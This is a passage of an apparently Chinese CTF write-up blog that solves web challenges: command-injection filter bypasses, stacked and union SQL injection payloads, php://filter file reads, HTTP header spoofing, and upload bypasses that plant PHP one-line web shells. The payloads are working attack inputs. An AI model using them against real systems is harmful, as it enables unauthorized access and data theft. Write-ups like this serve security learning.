<p>全部进行实验可以发现只有$IFS$1可以绕过但同时也发现flag也被过滤<br><img src="https://pic.imgdb.cn/item/653c73fac458853aef368ed2.jpg" alt="图十六" title="绕过空格但是flag也被过滤"><br>没办法,只可以读取index.php看看过滤规则<br><img src="https://pic.imgdb.cn/item/653c740ec458853aef36d458.jpg" alt="图十七" title="利用代码里面的漏洞进行过滤"><br>可以知道,过滤全是正则,什么大小写都不行,但存在一个变量$a,那么我们可以利用这个进行传参实现绕过。<br>payload:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=g;<span class="built_in">cat</span><span class="variable">$IFS</span><span class="variable">$1fla</span><span class="variable">$a</span>.php</span><br></pre></td></tr></table></figure>
<p>这里打开后不会立刻看到flag,那么我们就要坚定内心,坚信自己一定没错究竟是在哪里呢,查看源码成功获取flag。<br><img src="https://pic.imgdb.cn/item/653c7419c458853aef36fd3c.jpg" alt="图十八" title="查看源码获取flag"><br>参考:<a href="https://blog.csdn.net/2301_78136321/article/details/133294740">https://blog.csdn.net/2301_78136321/article/details/133294740</a><br>这道题我觉得是有点恶心的,对于我来说前面已经耗费太多精力了,本想着终于获取到flag了,但是空空如也还看看源码,心态容易崩,还要继续提升。</p>
<h2 id="强网杯-2019-随便注–SQL注入-堆叠注入"><a href="#强网杯-2019-随便注–SQL注入-堆叠注入" class="headerlink" title="[强网杯 2019]随便注–SQL注入|堆叠注入"></a>[强网杯 2019]随便注–SQL注入|堆叠注入</h2><p>开启靶机,是一个熟悉的sql注入题目(有提示)。<br>先判断有无注入点以及是字符型或者数字型。<br>这里测试出来存在注入点以及是字符型(输入1没报错,1’报错)。<br><img src="https://pic.imgdb.cn/item/653c7c44c458853aef5534cd.jpg" alt="图十九" title="判断有无注入点以及是字符型或者数字型"><br>!!!tips:想说一句,看到带输入框的,尽量把注入语句写到框内<br>继续测试,这里用or而非and(原因是前面1’错误,or后面的1&#x3D;1为真,那么总体为真就会把所有数据都输出;而and只会报错输出一个)。<br>也就是:or爆全;and爆一个。<br><img src="https://pic.imgdb.cn/item/653c7c49c458853aef55455b.jpg" alt="图二十" title="or"><br>接着使用order by判断列数。<br><img src="https://pic.imgdb.cn/item/653c7c57c458853aef5575ff.jpg" alt="图二十一" title="order by判断列数"><br><img src="https://pic.imgdb.cn/item/653c7c5ec458853aef558cd9.jpg" alt="图二十二" title="order by判断列数"><br>判断出来是存在两列,猜测是id号+数据。开始真正意义上的注入<br>先来一个union+select(大小写均是一遍)<br>发现存在过滤<br><img src="https://pic.imgdb.cn/item/653c97aac458853aefb6d4a9.jpg" alt="图二十三" title="发现存在过滤"><br>返回一个正则过滤规则，可以看到几乎所有常用的字段都被过滤了。这里尝试过双写绕过，16进制绕过等；不过过滤机制太强，都不行。<br>这里技穷了,没有任何思路,看了下wp,才想到可以堆叠注入(注意使用数据库语句)。<br>先试着查一下数据库</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;<span class="keyword">show</span> databases;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>成功查询到,说明存在堆叠注入,那么我们后面都围绕堆叠注入展开。<br><img src="https://pic.imgdb.cn/item/653c9845c458853aefb9b864.jpg" alt="图二十四" title="存在堆叠"><br>再爆表</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;<span class="keyword">show</span> tables;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/653c984cc458853aefb9dd3d.jpg" alt="图二十五" title="堆叠爆表"><br>可以看到当前库下有两张表（1919810931114514和words）。<br>先查words表中的列名</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;show columns <span class="keyword">from</span> <span class="built_in">words</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>发现只有id与data两个字段,应该不存在flag,继续看下一个表先。<br><img src="https://pic.imgdb.cn/item/653c984cc458853aefb9dd3d.jpg" alt="图二十六" title="堆叠爆字段"><br>注意:<br>对于纯数字的表名,要用``括起来<br>就是tableName是纯数字，需要用``包裹，比如<br>方式一:1’;desc `1919810931114514`;#<br>方式二:1’; show columns from `1919810931114514`;#<br>发现存在flag字段,就差一步了,加油。<br><img src="https://pic.imgdb.cn/item/653c9861c458853aefba4716.jpg" alt="图二十七" title="爆出存在flag的表"><br>最后读取这一步,又不会了,继续借鉴。<br>!!!该题目的查询语句很有可能是：select id,data from words where id &#x3D;，因为我们输入1，回显的是两个字段，这与words表符合，而1919810931114514表中只有一列,那怎么办呢。<br>4种方法:<br>1、多方了解,才想到改名,就是它的查询语句是selsect id,data from words where id &#x3D;,那么我们令原来的words表为另一个名字,而我们的目标1919810931114514这张表改为words,那么我们查询的时候,就会带入这个带有flag的表查询,从而爆出flag。<br>数据库知识:<br>修改表名：ALTER TABLE 旧表名 RENAME TO 新表名；<br>修改字段：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；<br>构造payload:把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id(或data)。</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;alter table <span class="built_in">words</span> rename <span class="keyword">to</span> words1;alter table `<span class="number">1919810931114514</span>` rename <span class="keyword">to</span> <span class="built_in">words</span>;alter table <span class="built_in">words</span> change flag <span class="built_in">id</span> varchar(<span class="number">50</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>这就实现了改名功能,只爆一个字段(id&#x2F;data)不影响,然后像刚开始那样子测试有无注入点那样,直接爆出flag。<br><img src="https://pic.imgdb.cn/item/653c986cc458853aefba7b6f.jpg" alt="图二十八" title="改名爆flag"><br>后面三种搬运一下,做知识总结。<br>2、handler函数。<br>handler不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：<br>打开表：HANDLER 表名 OPEN ;<br>查看数据： HANDLER 表名 READ next;<br>关闭表： HANDLER 表名 READ CLOSE;</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;HANDLER <span class="string">`1919810931114514`</span> OPEN;HANDLER <span class="string">`1919810931114514`</span> READ next;HANDLER <span class="string">`1919810931114514`</span> CLOSE;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>3、预编译方式<br>因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：<br>预编译相当于定一个语句相同，参数不同的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤,格式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="keyword">PREPARE</span> 名称 <span class="keyword">FROM</span> <span class="keyword">Sql</span>语句 ? ;</span><br><span class="line"><span class="number">2</span>、<span class="keyword">SET</span> <span class="variable">@x</span><span class="operator">=</span>xx;</span><br><span class="line"><span class="keyword">EXECUTE</span> 名称 <span class="keyword">USING</span> <span class="variable">@x</span>;</span><br></pre></td></tr></table></figure>
<p>例子:</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span>;<span class="function">PREPARE hacker <span class="keyword">from</span> <span class="title">concat</span>(<span class="params"><span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;elect&#x27;</span>, <span class="string">&#x27; * from \`1919810931114514\` &#x27;</span></span>)</span>;EXECUTE  hacker;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">也可以将select * from \`<span class="number">1919810931114514</span>\`语句进行<span class="number">16</span>进制编码，即：<span class="number">0</span>x73656c656374202a2066726f6d2060313931393831303933313131343531346</span><br><span class="line"><span class="number">1</span>&#x27;;PREPARE ck from 0x<span class="number">7365</span>6c<span class="number">65637420</span>2a<span class="number">206672</span>6f6d<span class="number">20603139313938</span><span class="number">31303933313131</span><span class="number">3435313460</span>;EXECUTE  ck;#</span><br></pre></td></tr></table></figure>
<p>4、利用MySql预处理<br>使用条件：HANDLER也被过滤了。<br>在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用MySql预处理语句配合concat拼接来执行sql语句拿flag。<br>最后总结一句话:安全与开发缺一不可。<br>参考：<a href="https://blog.csdn.net/qq_44640313/article/details/128308237">https://blog.csdn.net/qq_44640313/article/details/128308237</a></p>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>进入靶机,首先判断有无注入点。<br>输入1以上的int数据,发现有回显;而输入其他值则无回显。<br><img src="https://pic.imgdb.cn/item/65420741c458853aeff5cc1b.jpg" alt="图二十九" title="回显"><br><img src="https://pic.imgdb.cn/item/65420750c458853aeff5f3e6.jpg" alt="图三十" title="回显"><br>进一步测试,测试是数字型注入或者是字符行注入。</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> <span class="number">1</span>=<span class="number">1#</span></span><br><span class="line"><span class="symbol">1 </span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1#</span></span><br><span class="line"><span class="number">1</span><span class="comment">&#x27; and 1=1#</span></span><br><span class="line"><span class="number">1</span><span class="comment">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>
<p>这些payload全都测试过了,无一例外,全都回显nonono。<br><img src="https://pic.imgdb.cn/item/6542078ac458853aeff685d1.jpg" alt="图三十一" title="发现存在过滤"><br>说明存在and过滤|输出nonono说明存在过滤,存在对某一个字符串的过滤。<br>既然存在注入,连盲注都不能测试了,因为盲注语句也用到and&#x2F;or&#x2F;updatexml等。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">username</span>=xiaodi&#x27;or updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,version(),<span class="number">0</span>x7e),<span class="number">0</span>) or&#x27;&amp;password=<span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>那就只能尝试堆叠注入了。<br>输入payload:</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="comment">;show databases;</span></span><br></pre></td></tr></table></figure>
<p>成功爆出数据库。<br><img src="https://pic.imgdb.cn/item/65420797c458853aeff6a7d3.jpg" alt="图三十二" title="爆库"><br>接着爆表。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654207a6c458853aeff6cf7e.jpg" alt="图三十三" title="爆表"><br>再尝试爆表的字段</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> FLAG;</span><br></pre></td></tr></table></figure>
<p>输出nonono,发现对flag存在过滤。<br>到这里,思路戛然而止,暂停略微参考一下wp。<br>接下来回顾一下最开始我们输入的非0数字和0与字母所回显的内容：非0数字回显1,0和字母不会回显任何内容<br>先了解一下||操作符：<br>在MySQL中，操作符||表示“或”逻辑：<br>command1 || command2<br>c1和c2其中一侧为1则取1，否则取0<br> 这里猜测后端语句，因为只有当我们输入非零数字时才会会显出1，而0和其他全都无回显,而猜测逻辑大致是这样的：大胆猜测后端（内部查询语句）语句中有||操作符，只有我们输入非零数字才会满足||的逻辑为True从而进行回显的条件。也就是满足:select 输入的内容 ||  一个列名 from 表名。（select 输入数据 || flag from Flag）<br>确实很大胆.真的没想到ctf的题会这样考,利用mysql的’||’的逻辑把flag藏到后面,有回显但是回显’||’前面判断为真或假的值,以这样的方式藏flag。<br>那么这样的话,构造payload,就把mysql中’||’的逻辑改成连接的逻辑:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">1;<span class="built_in">set</span> <span class="attribute">sql_mode</span>=PIPES_AS_CONCAT;select 1</span><br><span class="line">注：</span><br><span class="line">(mssql中的<span class="string">&#x27;||&#x27;</span>就是连接的逻辑)</span><br><span class="line">1、这里需要借用到：设置 <span class="attribute">sql_mode</span>=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置）。</span><br><span class="line">2、这里的逻辑是先把||转换为连接操作符，注意分号隔断了前面的命令，所以要再次添加select来进行查询，这里把1换成其他非零数字也一样会回显flag。</span><br></pre></td></tr></table></figure>
<p>这样就可获取到flag。<br><img src="https://pic.imgdb.cn/item/654207b5c458853aeff6f5a1.jpg" alt="图三十四" title="修改mysql的&#39;||&#39;的逻辑爆flag"><br>参考:<code>https://blog.csdn.net/m0_62851980/article/details/124083026</code><br>总结出一套做sql注入的思路<br>1、先判断有无注入点:把字符全试一遍,看看有无规律,找出其逻辑;<br>   再用and&#x2F;or进一步判断;<br>2、再爆列数;<br>3、联合查询,先爆库,再爆表,再爆字段,最后爆数据;<br>4、若存在select等过滤,用到报错盲注或堆叠注入。</p>
<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>打开靶机,显示xxx的秘密,我不关心,我只关心zhaoflag然后吃西瓜。<br>看源码,有一个超链接,点开看一下,发现跳转到另一个界面,有一个大大的SELECT;点击进去,来到一个看起来是最后一个界面的界面,抓包看一下<br>发现一个文件<br><img src="https://pic.imgdb.cn/item/65421219c458853aef12072f.jpg" alt="图三十五" title="我只会吃西瓜"><br>跳转过去,发现flag所处位置以及文件的接收方式是以file作为属性接收的,且以get方式提交。<br><img src="https://pic.imgdb.cn/item/65421235c458853aef124699.jpg" alt="图三十六" title="serc3t的内容(这是一个关键的文件)"><br>进入flag.php,发现是一场空欢喜。<br><img src="https://pic.imgdb.cn/item/654212dec458853aef13d351.jpg" alt="图三十七" title="空欢喜"><br>看不到flag,那么就又要考虑到php伪协议。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>
<p>看到flag。<br><img src="https://pic.imgdb.cn/item/654212e4c458853aef13e159.jpg" alt="图三十八" title="php伪协议获取base64编码的flag"><br>看编码形式像base64编码,解码即可。得到flag。<br><img src="https://pic.imgdb.cn/item/654212f1c458853aef140081.jpg" alt="图三十九" title="解码得到flag"></p>
<p><code>!!!发现php伪协议配合文件包含挺多的。学习一下php伪协议。</code></p>
<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>1、配合文件读取,即网址栏含有?file&#x3D;或?filename&#x3D;诸如此类的字段–前提<br>2、再配合文件包含,即猜测其代码存在include某一个文件–关键<br>3、这样,即可尝试使用php伪协议读取那个文件。<br>常用payload(做题暂只遇到这一种):</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>xxx.xxx.xxx<span class="regexp">/index.php?filename=php:/</span><span class="regexp">/filter/</span>read=convert.base64-encode/resource=xxx.php</span><br><span class="line">作用:读取当前文件包含的文件。</span><br></pre></td></tr></table></figure>
<p>推荐阅读(详细讲解):<br><code>https://www.php.cn/faq/481803.html</code><br><code>https://blog.csdn.net/qq_37466661/article/details/126203437</code><br><code>https://blog.csdn.net/m0_56107268/article/details/127760614</code><br>但也存在限制,具体的限制看我的博客:<code>https://fzsecurity-github.github.io/2023/10/14/wenjianbaohan/?highlight=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB</code></p>
<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>嗯,我很爱sql……<br>进入靶机,是一个登陆界面,首先正常输入账号密码,嗯,返回一个账号密码错误的界面。那么测试有无注入点。</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> <span class="number">1</span>=<span class="number">1#</span></span><br><span class="line"><span class="symbol">1 </span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1#</span></span><br><span class="line"><span class="number">1</span><span class="comment">&#x27; and 1=1#</span></span><br><span class="line"><span class="number">1</span><span class="comment">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>
<p>其中,在账号栏一行中输入1’ or 1&#x3D;1#而且密码栏随便输入(以为存在先判断密码栏是否为空,再判断账号密码是否对上),发现即使不输入密码也显示出来信息。<br><img src="https://pic.imgdb.cn/item/65427681c458853aef667be3.jpg" alt="图四十" title="测试有无注入点时直接获取一个信息"><br>思考,我刚开始以为是某种编码,但是尝试了很多种编码的解码,一一失败,判定为乱码,那么只能进一步注入。<br>前期知道为字符型get注入,那么先判定字段数。<br>首先测试3字段,发现正常报错(输出查询异常信息);但是输入4的时候直接报错显示不存在4这个字段。即判定3字段。</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span><span class="comment">#;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span><span class="comment">#;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65427699c458853aef66db16.jpg" alt="图四十一" title="4列报错"><br><img src="https://pic.imgdb.cn/item/654276a5c458853aef670c4b.jpg" alt="图四十二" title="3行正常"><br>随后显示具体字段在哪个位置爆出<br>payload(密码随便填)：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654276cfc458853aef67f284.jpg" alt="图四十三" title="知道爆数据的位置"><br><code>这里有一个注意点:</code><br><code>经过测试,猜测该网站的后台代码会对接受过来的数据进行一次url解码,所以你在url栏输入payload时,你要进行url编码再填充进去。</code><br><code>如果你直接在账号输入栏测试则不需要。</code><br>好了,开始ggboom。<br>首先爆一些数据库名字,版本的相关信息。</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>(),<span class="built_in">version</span>()<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6543096cc458853aef746dc3.jpg" alt="图四十四" title="爆数据库基本信息"><br>然后,可以尝试使用mysql注入的思路,先判断mariaDB是否存在关键的几张表。<br><img src="https://pic.imgdb.cn/item/654309a5c458853aef74ec96.jpg" alt="图四十五" title="选择思路"><br>那么可以使用注入mysql数据库的思路。<br>爆库(可省略)</p>
<figure class="highlight capnproto"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654309c5c458853aef753670.jpg" alt="图四十六" title="爆库"><br>爆表</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;geek&#x27;</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654309d7c458853aef756b74.jpg" alt="图四十七" title="爆表"><br>爆字段(先爆l0ve1ysq1这张表,再爆geekuser这张表)</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;l0ve1ysq1&#x27;</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;geekuser&#x27;</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>发现字段都一样<br><img src="https://pic.imgdb.cn/item/654309e1c458853aef758713.jpg" alt="图四十八" title="爆字段"><br>那么爆字段值(数据)吧</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; union select <span class="number">1</span>,group<span class="constructor">_concat(<span class="params">username</span>)</span>,group<span class="constructor">_concat(<span class="params">password</span>)</span> from geekuser#</span><br></pre></td></tr></table></figure>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; union select <span class="number">1</span>,group<span class="constructor">_concat(<span class="params">username</span>)</span>,group<span class="constructor">_concat(<span class="params">password</span>)</span> from l0ve1ysq1#</span><br></pre></td></tr></table></figure>
<p> geekuser表中数据为<br> <img src="https://pic.imgdb.cn/item/654309fec458853aef75d16e.jpg" alt="图四十九" title="爆数据(字段)--geekuser"><br> geekuser的数据还是乱码,解析不了。那么寄希望于下一张表,l0ve1ysq1表中数据为<br> <img src="https://pic.imgdb.cn/item/65430a0fc458853aef75f9aa.jpg" alt="图五十" title="爆数据(字段)--l0ve1ysq1"><br>看不全,查看源码,获取flag<br> <img src="https://pic.imgdb.cn/item/65430a1ec458853aef761bbd.jpg" alt="图五十一" title="获取flag"><br> 总算是一道正常的没有堆叠的注入题了…嗯,lovesql。</p>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>打开靶机,界面是一个正常的网页,第一件事先看源码,发现确实有一个.php文件可以访问。<br><img src="https://pic.imgdb.cn/item/654317b9c458853aef96c798.jpg" alt="图五十二" title="发现关键key"><br>尝试访问,发现是一个warning,提示来源(Referer)必须是<a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a><br><img src="https://pic.imgdb.cn/item/65431865c458853aef9861b9.jpg" alt="图五十三" title="warning"><br>抓包修改,wp说:<code>这里有一个注意点，那就是你加的Referer字段必须在connection字段下面,不然会报错</code> –为什么,就算没在下面也可以<br><img src="https://pic.imgdb.cn/item/65431882c458853aef98a7ac.jpg" alt="图五十四" title="改包"><br>提示要使用浏览器Syclover,那么在user-agent字段修改<br><img src="https://pic.imgdb.cn/item/654318dbc458853aef996b19.jpg" alt="图五十五" title="二次改包"><br>提示要本地访问,那么添加一个X-Forwarded-For字段,值为127.0.0.1即可获取flag<br><img src="https://pic.imgdb.cn/item/65431904c458853aef99cb0d.jpg" alt="图五十六" title="改包获取flag"><br><code>(建议康康)关于数据包的一些讲解:https://blog.csdn.net/qq_63548648/article/details/128083782</code></p>
<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>打开靶机,提示菜刀不见了,还给了一句话木马,推测其网站下的目录存在有包含这个一句话木马的文件。想都不用想,连接上去就完事了。<br><img src="https://pic.imgdb.cn/item/65435b00c458853aef573dbc.jpg" alt="图五十七" title="看到一句话木马,直接连接"><br>点击测试连接,提示连接成功,成功getshell,就可getflag。<br><img src="https://pic.imgdb.cn/item/65435b11c458853aef576820.jpg" alt="图五十八" title="getshell|getflag"><br>这么简单?不可置信,看了看源码,嗯果然是白给的shell…</p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>开启靶机,发现是一个标准的文件上传的界面(挺好看的感觉)。<br>e,说回正题,我们先尝试直接上传.php文件看能不能一发入魂。<br><img src="https://pic.imgdb.cn/item/654afb56c458853aef788d76.jpg"><br>显然不能,存在过滤。<br>那么接下来我们就要思考如何实现绕过,上传包含一句话木马的文件,直接getshell。<br><code>MIME值绕过</code><br>抓包把MIME(Content-Type)的值改为正常的图片形式。</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">image/png</span><br><span class="line">image/jpg</span><br></pre></td></tr></table></figure>
<p>还是可以识别出来,pass。<br><img src="https://pic.imgdb.cn/item/654b0dc4c458853aefa98ee0.jpg"><br><code>大小写混写</code><br>亲测,不可以实现绕过。<br><code>php双写|把后缀直接改为php5、phtml等格式</code><br>可以绕过对于文件名的过滤,那么判断文件后缀检验方式为黑名单检测。<br>但是对文件内容&lt;?存在过滤。<br><img src="https://z1.ax1x.com/2023/11/08/pi1hxTs.jpg"><br>接下来思考:<code>如何绕过网站对文件内容的检测</code><br>那是不是有这样的思路:<code>既然你对php的标记有检测,那我可不可以使用php+java混编实现绕过?</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;111&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>但是发现还是绕过不了。<br><img src="https://pic.imgdb.cn/item/654b5c94c458853aefa8a4d3.jpg"><br>说明服务器不仅对前端进行了过滤，还对后端文件内容头做了校验。这里我们只能用文件幻术头来绕过试试。<br><code>GIF89a-文件幻术头绕过</code><br>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。<br>这里上传成功了,但是双写好像不行,推测它对文件名的遍历方式是记录前面的值,取这个全部遍历完后的值与黑名单匹配。那么浏览器可能解析不了,只能把后缀改为.phtml。<br><img src="https://pic.imgdb.cn/item/654b5cd7c458853aefa94b35.jpg"><br><img src="https://pic.imgdb.cn/item/654b5cf9c458853aefa9adb8.jpg"><br>上传成功后,那么就连接木马了。但这里,没有给出目录。<code>做题做多了,这种ctf一般不会太恶心,猜测存放上传文件的文件夹目录为upload</code><br>连接成功<br><img src="https://pic.imgdb.cn/item/654b5d46c458853aefaaa63e.jpg"><br>接下来就是愉快的找flag环节啦!<br>一般都在根目录下。成功获取flag。<br><img src="https://pic.imgdb.cn/item/654b5d60c458853aefaaf882.jpg"><br>from:<br><a href="https://blog.csdn.net/m0_49025459/article/details/124723482">https://blog.csdn.net/m0_49025459/article/details/124723482</a></p>
<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>挺简单,讲下思路,有一个点要注意。<br>开启靶机,将鼠标移动至中间,发现一个文件上传的功能。<br>1、直接开干,直接上传含有一句话的木马文件,发现存在白名单检测。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>这里我直接抓包,但是发现抓不了包,无奈我只好只用浏览器自带的抓包工具尝试是不是我的bp配置有问题,结果这一抓,让我发现了一个main.js文件,原来是前端验证,好说直接禁用js即可</code><br>2、禁用js后,继续上传木马,发现还是存在过滤,那么这里存在的是后端的过滤,这时候可以抓包了,抓包尝试绕过。<br>3、MIME绕过,更改为图片格式,还是被拦截。<br>4、文件后缀名绕过,改为php5、phtml一个一个试哪一个可以被对方网站解析,经检测,发现只有phtml这个后缀可以，<br>5、直接上传成功,蚁剑连接即可。</p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>这道题值得我好好记录一下,因为好久没练过sql(而且还存在过滤)了。<br>打开靶机,是一道正常的sql注入题目。<br><code>1、首先判断是字符型还是数字型</code><br><code>用户名输入1&#39;,如果是字符型,会报如下错误</code><br>注意红框外面的’是自带的，并不是查询语句的内容。<br><img src="https://pic.imgdb.cn/item/654cc37ac458853aef7b7321.jpg"><br><code>如果是数字型,则会爆3个单引号(数字被正常接收)</code><br><code>get一个小姿势:1、and一般用于判断是字符型还是数字型;2、or常用来作万能密码</code><br><code>2、判断是否存在注入点以及是否存在过滤</code></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">先: 1<span class="string">&#x27; or 1=1# --&gt;正常</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="attribute">1</span>=2# --&gt;爆错</span><br></pre></td></tr></table></figure>
<p>判断对or存在过滤(匹配到’or’,自动替换为空)–为什么可以判断对or存在过滤?？<br><code>首先#后的&#39;是没有闭合前的符号,刚开始我以为是对#存在过滤,但是如下图发现1=2#前少了个or,说明是对or存在过滤</code><br><img src="https://pic.imgdb.cn/item/654cc38ac458853aef7ba3af.jpg"><br>那就双写,成功绕过过滤。</p>
